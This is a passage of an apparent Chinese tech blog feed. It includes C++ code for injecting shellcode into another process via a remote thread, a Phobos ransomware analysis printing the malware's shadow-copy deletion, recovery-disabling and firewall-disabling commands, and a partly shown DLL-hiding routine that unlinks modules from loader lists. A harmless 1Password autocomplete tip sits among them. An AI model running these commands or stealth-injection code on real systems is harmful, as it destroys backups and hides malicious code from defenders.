class="literal">NULL</span>, shellcodeInfo-&gt;szText, shellcodeInfo-&gt;szCaption, shellcodeInfo-&gt;uType);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、将函数当作ShellCode写入目标进程中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入shellcode</span></span><br><span class="line">LPVOID lpShellcode = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">nullptr</span>, <span class="number">0x1000</span>, MEM_COMMIT  MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!lpShellcode) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, lpShellcode, RemoteMessageBox, <span class="number">0x1000</span>, <span class="literal">nullptr</span>)) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、使用远线程调用该函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 远线程执行shellcode</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="built_in">reinterpret_cast</span>&lt;LPTHREAD_START_ROUTINE&gt;(lpShellcode), lpParamBuff, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br></pre></td></tr></table></figure><p>6、禁用安全检查，防止出现地址相关代码<br><img src="/../uploads/2022/12/538320742.png" alt="2022-12-15T17:05:24.png" title="2022-12-15T17:05:24.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>该方法使用ShellCode不能在默认的Debug模式下运行，因为Debug模式下会对函数生成与地址有关的代码，所以会导致在目标进程中崩溃。而我们日常开发中可能需要调试其他代码，这就产生了冲突。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1、对函数使用static字段修饰，消除跳转表<br>2、使用调试库设置为否【英文叫Use Debug Libraries】</p><p><img src="/../uploads/2022/07/4180426210.png" alt="l5hv80t5.png" title="l5hv80t5.png"></p><p>3、支持仅我的代码调试设置为否【英文叫Support Just My Code Debugging】</p><p><img src="/../uploads/2022/07/1664544939.png" alt="l5hv8tqr.png" title="l5hv8tqr.png"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如果本文对你有所帮助，请麻烦点赞转发<del>。如果你有更好的Debug模式下保持shellcode干净方式，请留言哦</del></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ShellCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html支持1password的自动填充方式</title>
      <link href="/1fcfc7ff4658/"/>
      <url>/1fcfc7ff4658/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于近些年来，个人隐私数据的泄露，弱密码爆破等种种原因。笔者采用了1password来保存自身密码【谷歌浏览器的保存密码会被木马轻易偷取！！！】，而再编写网页的时候发现他不会在我的页面自动输入两步验证的密码，在别人的网站里却可以使用。通过笔者的一番查阅，其实支持1password自动填充很简单，那么具体怎么写请看下文。</p><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>在input框中设置autocomplete属性，设置属性autocomplete为off的话貌似1password会根据自身判定来决定该字段是否重要，从而决定是否自动填充。那么我们将autocomplete属性设置为非off，告诉1password该字段重要即可。</p><p>例如我们需要1password帮我们自动填充两步验证的一次性密码可以对autocomplete属性设置如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-input</span><br><span class="line">  v-model.number=&quot;loginFormData.code&quot;</span><br><span class="line">  placeholder=&quot;请输入两步验证码&quot;</span><br><span class="line">  autocomplete=&quot;one-time-code&quot;</span><br><span class="line">&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/el-input&gt;</span><br></pre></td></tr></table></figure><h2 id="autocomplete属性参考文档"><a href="#autocomplete属性参考文档" class="headerlink" title="autocomplete属性参考文档"></a>autocomplete属性参考文档</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete">https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete</a></p><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>希望本文对你提供了帮助~</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 1password </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phobos勒索病毒样本分析</title>
      <link href="/c09a10f15dba/"/>
      <url>/c09a10f15dba/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><hr><p>该样本隶属于Phobos家族。Phobos家族通常通过RDP暴力破解+人工投放的方式进行攻击。</p><p>攻击者成功入侵后，通常会关闭系统的安全软件防护功能，运行勒索病毒，加密后会修改文件后缀为&lt;原文件名&gt;+&lt;原文件后缀名&gt;+&lt;勒索信中的个人ID&gt;+&lt;联系邮箱&gt;+&lt;.Devos&gt;，目前该勒索无法解密。</p><h1 id="相关文件-IoCs"><a href="#相关文件-IoCs" class="headerlink" title="相关文件(IoCs)"></a>相关文件(IoCs)</h1><hr><p>该样本为公司样本，故不提供相关特征。</p><h1 id="传播方式"><a href="#传播方式" class="headerlink" title="传播方式"></a>传播方式</h1><hr><p>Phobos家族通常通过RDP暴力破解+人工投放+钓鱼邮件的方式进行攻击。</p><h1 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h1><h2 id="删除卷影拷贝以避免系统恢复"><a href="#删除卷影拷贝以避免系统恢复" class="headerlink" title="删除卷影拷贝以避免系统恢复"></a>删除卷影拷贝以避免系统恢复</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /all /quiet</span><br><span class="line">wmic shadowcopy delete</span><br><span class="line">bcdedit /set &#123;default&#125; bootstatuspolicy ignoreallfailures</span><br><span class="line">bcdedit /set &#123;default&#125; recoveryenabled no</span><br><span class="line">wbadmin delete catalog -quiet</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="/../uploads/2022/10/3025195306.png" alt="2022-10-28T09:53:51.png" title="2022-10-28T09:53:51.png"></p><h2 id="禁用Windows防火墙"><a href="#禁用Windows防火墙" class="headerlink" title="禁用Windows防火墙"></a>禁用Windows防火墙</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile state off</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="/../uploads/2022/10/2373699539.png" alt="2022-10-28T09:54:25.png" title="2022-10-28T09:54:25.png"></p><h2 id="将自身拷贝到其他目录下"><a href="#将自身拷贝到其他目录下" class="headerlink" title="将自身拷贝到其他目录下"></a>将自身拷贝到其他目录下</h2><p>将自身拷贝到多个位置，并设置对应的开机启动项。<br><img src="/../uploads/2022/10/27888332.png" alt="2022-10-28T09:54:53.png" title="2022-10-28T09:54:53.png"><br>向文件目录中插入自启动执行点 (ASEP) 项以在操作系统中实现持久化<br><img src="/../uploads/2022/10/3329422139.png" alt="2022-10-28T09:55:15.png" title="2022-10-28T09:55:15.png"></p><h2 id="进程提权"><a href="#进程提权" class="headerlink" title="进程提权"></a>进程提权</h2><p><img src="/../uploads/2022/10/3607268495.png" alt="2022-10-28T09:55:53.png" title="2022-10-28T09:55:53.png"></p><h2 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h2><p>遍历进程，并结束掉指定进程进程。主要包含数据库进程，以mysql和sqlserver等数据库进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msftesql.exe;sqlagent.exe;sqlbrowser.exe;sqlservr.exe;sqlwriter.exe;oracle.exe;ocssd.exe;dbsnmp.exe;synctime.exe;agntsvc.exe;mydesktopqos.exe;isqlplussvc.exe;xfssvccon.exe;mydesktopservice.exe;ocautoupds.exe;agntsvc.exe;agntsvc.exe;agntsvc.exe;encsvc.exe;firefoxconfig.exe;tbirdconfig.exe;ocomm.exe;mysqld.exe;mysqld-nt.exe;mysqld-opt.exe;dbeng50.exe;sqbcoreservice.exe;excel.exe;infopath.exe;msaccess.exe;mspub.exe;onenote.exe;outlook.exe;powerpnt.exe;steam.exe;thebat.exe;thebat64.exe;thunderbird.exe;visio.exe;winword.exe;wordpad.exe</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2022/10/2737945292.png" alt="2022-10-28T09:57:02.png" title="2022-10-28T09:57:02.png"></p><p><img src="/../uploads/2022/10/3521603420.png" alt="2022-10-28T09:57:13.png" title="2022-10-28T09:57:13.png"></p><p><img src="/../uploads/2022/10/503434174.png" alt="2022-10-28T09:57:24.png" title="2022-10-28T09:57:24.png"></p><h2 id="查询计算机名"><a href="#查询计算机名" class="headerlink" title="查询计算机名"></a>查询计算机名</h2><p><img src="/../uploads/2022/10/1404519046.png" alt="2022-10-28T09:57:43.png" title="2022-10-28T09:57:43.png"></p><h2 id="遍历回收站"><a href="#遍历回收站" class="headerlink" title="遍历回收站"></a>遍历回收站</h2><p><img src="/../uploads/2022/10/2142601799.png" alt="2022-10-28T09:58:01.png" title="2022-10-28T09:58:01.png"></p><h2 id="加密文件"><a href="#加密文件" class="headerlink" title="加密文件"></a>加密文件</h2><p>此次勒索软件变种使用了“RSA+AES”加密算法对所有文件进行加密<br><img src="/../uploads/2022/10/2536233754.png" alt="2022-10-28T09:58:27.png" title="2022-10-28T09:58:27.png"><br>加密完成后，删除原有文件。只保留加密后文件<br><img src="/../uploads/2022/10/4253749137.png" alt="2022-10-28T09:58:39.png" title="2022-10-28T09:58:39.png"><br><img src="/../uploads/2022/10/2916862905.png" alt="2022-10-28T09:58:51.png" title="2022-10-28T09:58:51.png"><br><img src="/../uploads/2022/10/1453892134.png" alt="2022-10-28T09:59:06.png" title="2022-10-28T09:59:06.png"><br><img src="/../uploads/2022/10/3460061528.png" alt="2022-10-28T09:59:13.png" title="2022-10-28T09:59:13.png"><br><img src="/../uploads/2022/10/1346956076.png" alt="2022-10-28T09:59:33.png" title="2022-10-28T09:59:33.png"><br><img src="/../uploads/2022/10/1285938708.png" alt="2022-10-28T09:59:44.png" title="2022-10-28T09:59:44.png"></p><h2 id="勒索信息"><a href="#勒索信息" class="headerlink" title="勒索信息"></a>勒索信息</h2><p><img src="/../uploads/2022/10/2244095522.png" alt="2022-10-28T10:00:05.png" title="2022-10-28T10:00:05.png"></p><p><img src="/../uploads/2022/10/3142231290.png" alt="2022-10-28T10:00:12.png" title="2022-10-28T10:00:12.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实现反射式注入</title>
      <link href="/5dc9b12b46b3/"/>
      <url>/5dc9b12b46b3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DLL模块隐藏技术[x86/x64]</title>
      <link href="/3f03a044ba7f/"/>
      <url>/3f03a044ba7f/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用PE结构，将模块从链表中摘除，注意该方法只适用于R3，R0还是有办法看到的。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>注意：代码为64位，32位道理一样，需要稍微改改？之前的代码了忘了支不支持32位了~</p><h3 id="HideDll-h"><a href="#HideDll-h" class="headerlink" title="HideDll.h"></a>HideDll.h</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NT_SUCCESS(x) ((x) &gt;= 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ProcessBasicInformation (PROCESS_INFORMATION_CLASS)0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* PFN_NtQueryInformationProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN HANDLE               ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PROCESS_INFORMATION_CLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PVOID               ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">IN ULONG                ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PULONG              ReturnLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* PFN_NtReadVirtualMemory)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN HANDLE               ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PVOID                BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PVOID               Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">IN ULONG                NumberOfBytesToRead,</span></span></span><br><span class="line"><span class="params"><span class="function">OUT PULONG              NumberOfBytesReaded OPTIONAL)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> &#123;</span><br><span class="line">USHORT Length;                                                          <span class="comment">//0x0</span></span><br><span class="line">USHORT MaximumLength;                                                   <span class="comment">//0x2</span></span><br><span class="line">WCHAR* Buffer;                                                          <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x58 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">ULONG Length;                                                           <span class="comment">//0x0</span></span><br><span class="line">UCHAR Initialized;                                                      <span class="comment">//0x4</span></span><br><span class="line">VOID* SsHandle;                                                         <span class="comment">//0x8</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InLoadOrderModuleList;                               <span class="comment">//0x10</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InMemoryOrderModuleList;                             <span class="comment">//0x20</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InInitializationOrderModuleList;                     <span class="comment">//0x30</span></span><br><span class="line">VOID* EntryInProgress;                                                  <span class="comment">//0x40</span></span><br><span class="line">UCHAR ShutdownInProgress;                                               <span class="comment">//0x48</span></span><br><span class="line">VOID* ShutdownThreadId;                                                 <span class="comment">//0x50</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x7c8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line">UCHAR InheritedAddressSpace;                                            <span class="comment">//0x0</span></span><br><span class="line">UCHAR ReadImageFileExecOptions;                                         <span class="comment">//0x1</span></span><br><span class="line">UCHAR BeingDebugged;                                                    <span class="comment">//0x2</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">UCHAR BitField;                                                     <span class="comment">//0x3</span></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">UCHAR ImageUsesLargePages : <span class="number">1</span>;                                    <span class="comment">//0x3</span></span><br><span class="line">UCHAR IsProtectedProcess : <span class="number">1</span>;                                     <span class="comment">//0x3</span></span><br><span class="line">UCHAR IsImageDynamicallyRelocated : <span class="number">1</span>;                            <span class="comment">//0x3</span></span><br><span class="line">UCHAR SkipPatchingUser32Forwarders : <span class="number">1</span>;                           <span class="comment">//0x3</span></span><br><span class="line">UCHAR IsPackagedProcess : <span class="number">1</span>;                                      <span class="comment">//0x3</span></span><br><span class="line">UCHAR IsAppContainer : <span class="number">1</span>;                                         <span class="comment">//0x3</span></span><br><span class="line">UCHAR IsProtectedProcessLight : <span class="number">1</span>;                                <span class="comment">//0x3</span></span><br><span class="line">UCHAR IsLongPathAwareProcess : <span class="number">1</span>;                                 <span class="comment">//0x3</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">UCHAR Padding0[<span class="number">4</span>];                                                      <span class="comment">//0x4</span></span><br><span class="line">VOID* Mutant;                                                           <span class="comment">//0x8</span></span><br><span class="line">VOID* ImageBaseAddress;                                                 <span class="comment">//0x10</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span>* Ldr;                                              <span class="comment">//0x18</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS</span>* ProcessParameters;                 <span class="comment">//0x20</span></span><br><span class="line">VOID* SubSystemData;                                                    <span class="comment">//0x28</span></span><br><span class="line">VOID* ProcessHeap;                                                      <span class="comment">//0x30</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_CRITICAL_SECTION</span>* FastPebLock;                              <span class="comment">//0x38</span></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">_SLIST_HEADER</span>* <span class="keyword">volatile</span> AtlThunkSListPtr;                         <span class="comment">//0x40</span></span><br><span class="line">VOID* IFEOKey;                                                          <span class="comment">//0x48</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">ULONG CrossProcessFlags;                                            <span class="comment">//0x50</span></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">ULONG ProcessInJob : <span class="number">1</span>;                                           <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessInitializing : <span class="number">1</span>;                                    <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessUsingVEH : <span class="number">1</span>;                                        <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessUsingVCH : <span class="number">1</span>;                                        <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessUsingFTH : <span class="number">1</span>;                                        <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessPreviouslyThrottled : <span class="number">1</span>;                             <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessCurrentlyThrottled : <span class="number">1</span>;                              <span class="comment">//0x50</span></span><br><span class="line">ULONG ProcessImagesHotPatched : <span class="number">1</span>;                                <span class="comment">//0x50</span></span><br><span class="line">ULONG ReservedBits0 : <span class="number">24</span>;                                         <span class="comment">//0x50</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">UCHAR Padding1[<span class="number">4</span>];                                                      <span class="comment">//0x54</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">VOID* KernelCallbackTable;                                          <span class="comment">//0x58</span></span><br><span class="line">VOID* UserSharedInfoPtr;                                            <span class="comment">//0x58</span></span><br><span class="line">&#125;;</span><br><span class="line">ULONG SystemReserved;                                                   <span class="comment">//0x60</span></span><br><span class="line">ULONG AtlThunkSListPtr32;                                               <span class="comment">//0x64</span></span><br><span class="line">VOID* ApiSetMap;                                                        <span class="comment">//0x68</span></span><br><span class="line">ULONG TlsExpansionCounter;                                              <span class="comment">//0x70</span></span><br><span class="line">UCHAR Padding2[<span class="number">4</span>];                                                      <span class="comment">//0x74</span></span><br><span class="line">VOID* TlsBitmap;                                                        <span class="comment">//0x78</span></span><br><span class="line">ULONG TlsBitmapBits[<span class="number">2</span>];                                                 <span class="comment">//0x80</span></span><br><span class="line">VOID* ReadOnlySharedMemoryBase;                                         <span class="comment">//0x88</span></span><br><span class="line">VOID* SharedData;                                                       <span class="comment">//0x90</span></span><br><span class="line">VOID** ReadOnlyStaticServerData;                                        <span class="comment">//0x98</span></span><br><span class="line">VOID* AnsiCodePageData;                                                 <span class="comment">//0xa0</span></span><br><span class="line">VOID* OemCodePageData;                                                  <span class="comment">//0xa8</span></span><br><span class="line">VOID* UnicodeCaseTableData;                                             <span class="comment">//0xb0</span></span><br><span class="line">ULONG NumberOfProcessors;                                               <span class="comment">//0xb8</span></span><br><span class="line">ULONG NtGlobalFlag;                                                     <span class="comment">//0xbc</span></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> CriticalSectionTimeout;                            <span class="comment">//0xc0</span></span><br><span class="line">ULONGLONG HeapSegmentReserve;                                           <span class="comment">//0xc8</span></span><br><span class="line">ULONGLONG HeapSegmentCommit;                                            <span class="comment">//0xd0</span></span><br><span class="line">ULONGLONG HeapDeCommitTotalFreeThreshold;                               <span class="comment">//0xd8</span></span><br><span class="line">ULONGLONG HeapDeCommitFreeBlockThreshold;                               <span class="comment">//0xe0</span></span><br><span class="line">ULONG NumberOfHeaps;                                                    <span class="comment">//0xe8</span></span><br><span class="line">ULONG MaximumNumberOfHeaps;                                             <span class="comment">//0xec</span></span><br><span class="line">VOID** ProcessHeaps;                                                    <span class="comment">//0xf0</span></span><br><span class="line">VOID* GdiSharedHandleTable;                                             <span class="comment">//0xf8</span></span><br><span class="line">VOID* ProcessStarterHelper;                                             <span class="comment">//0x100</span></span><br><span class="line">ULONG GdiDCAttributeList;                                               <span class="comment">//0x108</span></span><br><span class="line">UCHAR Padding3[<span class="number">4</span>];                                                      <span class="comment">//0x10c</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_CRITICAL_SECTION</span>* LoaderLock;                               <span class="comment">//0x110</span></span><br><span class="line">ULONG OSMajorVersion;                                                   <span class="comment">//0x118</span></span><br><span class="line">ULONG OSMinorVersion;                                                   <span class="comment">//0x11c</span></span><br><span class="line">USHORT OSBuildNumber;                                                   <span class="comment">//0x120</span></span><br><span class="line">USHORT OSCSDVersion;                                                    <span class="comment">//0x122</span></span><br><span class="line">ULONG OSPlatformId;                                                     <span 